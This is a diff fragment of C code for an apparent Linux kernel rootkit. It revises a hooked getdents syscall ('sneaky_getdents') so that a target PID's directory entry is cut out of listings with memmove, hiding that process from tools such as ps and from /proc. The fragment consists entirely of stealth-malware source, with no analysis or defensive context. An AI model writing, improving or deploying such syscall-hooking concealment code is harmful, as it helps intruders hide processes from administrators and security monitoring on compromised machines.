@@ -114,10 +114,22 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
 	i-=cur_dirp->d_reclen;
 
 		if(strcmp( (char*) &(cur_dirp->d_name), (char*) pid) == 0){
-			printk(KERN_INFO "!!!! PID FOUND !!!!\n");
-			cur_dirp->d_off = 1024;
-			ret -= cur_dirp->d_reclen;
-
+			printk(KERN_INFO "!!!! PID FOUND !!!! %s\n", cur_dirp->d_name);
+			
+			if(i !=0 ){
+				memmove(cur_dirp, (char *) cur_dirp + cur_dirp->d_reclen, i);
+			}
+			else{
+				cur_dirp->d_off = 1024;
+				ret -= cur_dirp->d_reclen;
+			}
+			if(cur_dirp->d_reclen == 0){
+				ret -=i;
+				i=0;
+			}
+			if(i!=0){
+				cur_dirp = (struct linux_dirent *) ( (char *) cur_dirp + cur_dirp->d_reclen );
+			}
 			memcpy(dirp, alt_dirp, ret);
 			kfree(alt_dirp);
 			return ret;
